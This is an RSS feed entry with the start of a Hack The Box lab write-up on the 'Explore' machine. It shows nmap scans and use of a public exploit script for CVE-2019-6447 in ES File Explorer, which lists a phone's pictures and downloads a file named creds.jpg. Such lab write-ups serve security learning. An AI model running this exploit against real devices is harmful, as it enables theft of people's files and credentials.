<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Es-File-Explorer on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/es-file-explorer/</link><description>Recent content in Es-File-Explorer on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 05 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/es-file-explorer/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Explore</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/explore/</link><pubDate>Sat, 05 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/explore/</guid><description>&lt;h1 id="explore">Explore&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.247 -T5
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:40 BST
Warning: 10.10.10.247 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.247 (10.10.10.247)
Host is up (0.12s latency).
Not shown: 65530 closed ports
PORT STATE SERVICE
2222/tcp open EtherNetIP-1
5555/tcp filtered freeciv
42135/tcp open unknown
59777/tcp open unknown
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -p2222,38925,42135,59777 -Pn 10.10.10.247 -sC -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:32 BST
Nmap scan report for 10.10.10.247 (10.10.10.247)
Host is up (0.12s latency).
PORT STATE SERVICE VERSION
2222/tcp open ssh (protocol 2.0)
| fingerprint-strings:
| NULL:
|_ SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42135/tcp open http ES File Explorer Name Response httpd
|_http-title: Site doesn&amp;#39;t have a title (text/html).
59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&amp;#39;t have a title (text/plain).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.94%I=7%D=8/6%Time=64CFCB14%P=x86_64-pc-linux-gnu%r(NUL
SF:L,24,&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;);
Service Info: Device: phone
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
&lt;/code>&lt;/pre>&lt;h2 id="footholduser">Foothold/User&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code> suggests &lt;code>Minecraft server&lt;/code>
&lt;ul>
&lt;li>Googling tells it&amp;rsquo;s &lt;a href="https://www.speedguide.net/port.php?port=59777" target="_blank" rel="noopener">ES File Explorer File Manager&lt;/a> with &lt;code>CVE-2019-6447&lt;/code>&lt;/li>
&lt;li>We have a &lt;a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">github repo&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ python3 cve-2019-6447.py list
######################
# Available Commands #
######################
listFiles: List all the files
listPics: List all the pictures
listVideos: List all the videos
listAudios: List all the audio files
listApps: List all the apps installed
listAppsSystem: List all the system apps
listAppsPhone: List all the phone apps
listAppsSdcard: List all the apk files in the sdcard
listAppsAll: List all the apps installed (system apps included)
getDeviceInfo: Get device info. Package name parameter is needed
appPull: Pull an app from the device
appLaunch: Launch an app. Package name parameter is needed
getAppThumbnail: Get the icon of an app. Package name parameter is needed
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>While going through every command we notice &lt;code>creds.jpg&lt;/code> file&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ python3 cve-2019-6447.py --cmd listPics --host 10.10.10.247
[*] Executing command: listPics on 10.10.10.247
[*] Server responded with: 200
{&amp;#34;name&amp;#34;:&amp;#34;concept.jpg&amp;#34;, &amp;#34;time&amp;#34;:&amp;#34;4/21/21 02:38:08 AM&amp;#34;, &amp;#34;location&amp;#34;:&amp;#34;/storage/emulated/0/DCIM/concept.jpg&amp;#34;, &amp;#34;size&amp;#34;:&amp;#34;135.33 KB (138,573 Bytes)&amp;#34;, },
{&amp;#34;name&amp;#34;:&amp;#34;anc.png&amp;#34;, &amp;#34;time&amp;#34;:&amp;#34;4/21/21 02:37:50 AM&amp;#34;, &amp;#34;location&amp;#34;:&amp;#34;/storage/emulated/0/DCIM/anc.png&amp;#34;, &amp;#34;size&amp;#34;:&amp;#34;6.24 KB (6,392 Bytes)&amp;#34;, },
{&amp;#34;name&amp;#34;:&amp;#34;creds.jpg&amp;#34;, &amp;#34;time&amp;#34;:&amp;#34;4/21/21 02:38:18 AM&amp;#34;, &amp;#34;location&amp;#34;:&amp;#34;/storage/emulated/0/DCIM/creds.jpg&amp;#34;, &amp;#34;size&amp;#34;:&amp;#34;1.14 MB (1,200,401 Bytes)&amp;#34;, },
{&amp;#34;name&amp;#34;:&amp;#34;224_anc.png&amp;#34;, &amp;#34;time&amp;#34;:&amp;#34;4/21/21 02:37:21 AM&amp;#34;, &amp;#34;location&amp;#34;:&amp;#34;/storage/emulated/0/DCIM/224_anc.png&amp;#34;, &amp;#34;size&amp;#34;:&amp;#34;124.88 KB (127,876 Bytes)&amp;#34;}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Let&amp;rsquo;s download and open it&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ python3 cve-2019-6447.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
from: 10.10.10.247
[*] Server responded with: 200
[*] Writing to file: creds.jpg
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/explore/images/1.png">&lt;/p></description></item></channel></rss>